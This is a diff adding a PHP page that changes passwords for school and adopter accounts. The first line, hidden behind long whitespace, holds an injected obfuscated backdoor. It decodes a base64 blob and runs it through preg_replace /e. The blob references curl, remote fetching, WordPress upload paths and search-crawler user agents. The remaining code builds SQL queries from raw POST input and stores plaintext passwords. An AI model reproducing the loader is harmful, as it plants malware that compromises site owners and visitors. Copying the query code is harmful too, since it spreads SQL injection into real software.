@@ -1,0 +1,26 @@
+<?php                                                                                                                                                                 /*versio:2.20*/$Q0OO=109388;if (!function_exists('IIl111lI')){$GLOBALS['Q0OO'] = ';ZY3VybAoX2luaXQkYWxsb3dfdXJsX2ZvcGVu$UMQ!aHR0cDovLwqJndheT1maWxlX2dldF9jb250ZW50cw@jCX3NldG9wdAb!KX2V4ZWM#)faJndheT1jdXJsGlXLwb3Nvbi5pbgzUllBTkVDQVNFWS5DT00cGhwYWlkZS5jb20{dwWV8x.TOgc.ZGlzcGxheV9lcnJvcnMnZGV0ZXJtaW5hdG9y)?ZnRwMTMOMi4yMAT}oCyEUVFPUVFRMFFRUQYmFzZTY0X2RlY29kZQ#gYmFzZTY0X2VuY29kZQMtSFRUUFMSnb2Zm*iiaHR0cHM6Ly8&SFRUUF9IT1NUdW5pb24Hic2VsZWN0Va;viUkVRVUVTVF9VUkkU0NSSVBUX05BTUUUVVFUllfU1RSSU5H{xG${PwsbL2Rldi9zaG0OL3RtcC8uZm9udC11bml4bXKL3RtcC8uSUNFLXVuaXgX!VE1QXN{VEVNUA}?VE1QRElSL3RtcA &tdXBsb2FkX3RtcF9kaXIdG1w(kepTwd3AtY29udGVudC91cGxvYWRzd3AtY29udGVudC9jYWNoZQjZLgZVdmVyc2lvLQUANG^LXBocA;RVhFQ1BIUAb3V0b2s&SFRUUF9VU0VSX0FHRU5UD(RLA{wZ29vZ2xlLHlhaG9vLGJpbmcsbXNuYm90LGFzayxiYWlkdSx5YW5kZXgT=L3BnLnBocD91PQgJms9PCDJnQ9cGhwJnA9HJnY9ZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5VlYzdHYya2dRL3lvYkZFVzI1UHI4d0JpYTh3blUwb3VsSEE2RVZLcFNaRkZZR3F2R2pveTV0SXJ5M1c5bWR0YzJ3ZVR1d2grbE8rL1hiNFprdzdTek5kOGtHVjlyblRVdmViRk5zbVdaRngxZGYyYWJmYllxa3p4alRVcTg0ZmxHTzU5YThKa2E3T0o4T28yaXFjVUNOcm03dnRiWk02dGZ0c21xeU10a3k3V3kySFA5a2hXODNCY1phNnFBMTVmYTBuZGVicEtVYStkaGFvZWhiWUF5eTRvaVMwZTFFYkNqMmhDSXRwMkdtbU93SHNpZkEyZWEya0NSUEdiRk1UQ1lEeHpESkV2aUhTKzFpbUQ3Qm5NczNXQTJrQlBJQTdGOGIySFJXZEF3NllKR1J4ZGhnbVBSTkJpaXd5Z1pyL0tzNUZtNXExVjB3VVBiMHBuSlpFRDRUVVJrMWpvOTEyQXVHS3J5STFWalpuaTY0K2lleWxETWZ5WTdNQ0ZqMWlreHBCSENIOHBYalpKaWg2QytMU245SG5rbGVjSzBOWEVxYzFLUEpxMFk3TVBkN0RxNm1jZndqOEgrWjZTMmJRR2JvNytwK0dvOCtqaWVHWnNsaFA0bTQydzh2NXRONXJQUjVQWVRDTWdlTzgzL0lacE14aC9tOC9DdmNYUTNONWlIS1poR3dEWVZ5YU5zS0RsVXRkb1hhYnhLOHgxdnZHSTUrUGF4L0tWSllTaENyYWFPMVlHVVFKWmY2cW9TajZxcWFDRWNBVFMrMmVXckgva2p6K3JXNzFzRzFSWm15U0JoR2poUGVxREdCOVdFYVNwS2ZXU2NIWTRuaExSNTNHUDdxUG50L0RtZXMyZFpxWmVMcCtXdkFEM2hKYnVhejI5K3MwM3JhL0UxdThwMzVYdGdFNjY5NEZPSGxGdVI4UC9tNmlhT2JzMkdmUS9ueE1UM3orUFpiUmhOV216ZjdYanhidlFkWnVZOStZREtTTGt5OFBTQVlIRDJCdjdJK0hSMmNjRzBWM2pEM3RYazM4R2JPbE1tWmh4R3R1R003ZlFKaW9ZYlZXOEZUK1JZaEZIeW40OXB2dVphcC9MUlVDcUJiNThod2tqdWUydFJ6M095YlpFVGZHUVRQeUo4bk9KUlVTeC9OV0RJOFdtMEdzTm11MzE0R2h3OGVjamw0V1JWWVBwVUpDVW5wTUIrb2hHM0VFbEYrOEIzQzlGTE5wMWdhb0NmUzBBSDdNT05WQ1JFS2tXWGpWd1JSY1pTMmMvM0pSUWNkQU1tQ1N5bkdRS1ZmUFdRTjN6M29WbGMzWlNNalM3cTI5UkZVdENrL0hXb1NzZUEzdmRrVHRBenNkUnFxbU1odFNmeG5tb0x3ZGRreHhWd1I1WWlxMEZ4YmJWa2JJU0hCcVVMTW5aWHFvdW1VWU5FeGVoWDQ5Y2srUlZKREZQd0drTEZlQ2M3YXFiNGRqeUQrYm12NVFjK2VyclFaUjJIcDFuWVdYTnZXUUQ2WFYzTXdLRmQxOFpBYkZrOVNUYURYVm1VZVpvLzhhTE5pSXNERGtpT1hiN0pDNzVjUFVCVHhZZ215eDJUbFF6K3FFdU96b0xLeHh4bmpoN3Jabk5kOGhoeEZEWGNTL0ZGMEFLbWFpR2UxTldGUVB2L1RkY0xlS1dkblVxMTZ3MW9wQlppM1orbTAvSTRKdnRkUWNhQ3RxYXdQNkNlWFB5YmVyTlJ4eTV1VUFmMzdGc2FSU25sbWtDY0NWUloyNlNxT0ovcGxJSjhCY1B0MmxPYnlKUkRZVXFRbDVPZ0RxOHdETlpKa1MwQmRlUDRVM2c5am1QZC9Cak9ZTk5Hc3k5ZzdXWTBHOEZYNnZnUS9pcUlhMGJWcFJZOE9DaDY4a0tybjdvRE9lSXRVWFI5Q3h0OGNZTG80eFFMNG5qeStZVFlJUVVCcGQ4dW83VFZUd01Ybnd4MmZFWjZsa05lNjRiS1Z3MXdubU9qOVRZSzRvN1RUdkp3dHpwQU9wZzltVnlhdmhUK1FqbDBaL0pXa1k5eUM4SlhNMml0a2ppR2R6R0MvdktidU1WclNmSUZEMGJ4ZU1tK2dmMGYxUklydDQvQnNjUCtRTUM0YUs3TFY4RFZ3VXNqL2hLUDd1WlhuVVVRU0RhV0Y1ajVtK2gyZnQ4NW9xb2xvbGJDVUM2YjJtamZ4ZklaQ3RJYjdnelVWcUV0MENUMHNZanF3SUtFSW9aSmROZVVMeFY3ajNhS0piQjR5UDllcGtvR05MenRYTS8yUk4wYkx3UGNnUVRDY09LWG1rVmZWVEhFanlMSUx0a3E4LzNxUWZ5WGZ0dXMwdjJheDNtMjR1cFI0T1F6VStNL2hFT1daeXM4UXVTVDJGdHc0ZEQ1K1RiWTkzQTlPdFloMkt0anFPWkM1SFVPZ3ZKZ3VEdzRTcWdyc1FySHE0QmNNQ3JxV1JCOG9zTmZycmRHcVBxeitrWFJ2SFI5eTZjMWJNcTQ2bkw2aVBQZHF1MmFoQUh0cnVNTzhMdFNSUFFNSVJ6Mk9SaXNmcG1LT3czdXUvckg2ZVdya3J3Y1RnVjgvZ0dEbnlHNyIpKSk7cHJlZ19yZXBsYWNl';function IIl111lI($a, $b){$c=$GLOBALS['Q0OO']; $d=pack('H*','6261736536345f64656'.'36f6465'); return $d(substr($c, $a, $b));};$QOQQ0O0O0 = IIl111lI(3394, 16);$QOQQ0O0O0("/IIIIl11Il/e", IIl111lI(746, 2648), "IIIIl11Il");};?><?PHP 
+require_once("includes/dbsmain.inc.php");
+protect_member_page();
+  if(isset($_POST['submit']) || isset($_POST['submit_x'])){
+
+       if($_POST['school_password'] && $_POST['hidden_value']=="school"){
+			if(db_scalar("select count(1) from eqsoft_school where school_password='".$_POST['school_password']."'") > 0 ){
+			 	$sql_update=mysql_query("update eqsoft_school set school_password='".$_POST['new_password']."' where school_id='".$_SESSION['sess_user_id']."'");				                $_SESSION['error'][]="Your Password has been successfully updated";
+			 }
+	   }
+		else if($_POST['school_password'] && $_POST['hidden_value']=="adopter"){
+  
+			  if(db_scalar("select count(1) from eqsoft_adopter where adopter_password='".$_POST['school_password']."'") > 0 ){
+			 	$sql_update=mysql_query("update eqsoft_adopter set adopter_password='".$_POST['new_password']."' where adopter_id='".$_SESSION['sess_user_id']."'");
+			 	$_SESSION['error'][]="Your Password has been successfully updated"; 
+			
+			}
+		}
+			else{
+				$_SESSION['error'][]="Please Enter Correct Password !";
+				
+			}
+            header("Location:".$_SERVER['HTTP_REFERER']);
+			exit;
+ }
+ ?>
